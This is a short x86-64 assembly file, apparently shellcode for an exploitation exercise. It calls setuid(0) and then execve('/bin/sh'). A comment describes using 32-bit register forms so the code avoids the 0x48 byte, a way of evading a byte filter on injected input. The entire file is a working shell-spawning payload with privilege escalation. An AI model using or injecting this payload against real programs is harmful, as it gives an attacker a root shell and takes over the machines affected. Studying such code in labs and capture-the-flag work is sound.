.global _start
_start:
.intel_syntax noprefix
	mov eax, 105                # Instead of use the 64 bit form of the registers, use the 32 bit form of them. The opcode 0x48 (H char) is caused
	mov edi, 0                  # by using 64 bit form of registers.!
	syscall
	mov eax, 59
	lea edi, [rip+binsh]
	mov esi, 0
	mov edx, 0
	syscall
binsh:
	.string "/bin/sh"

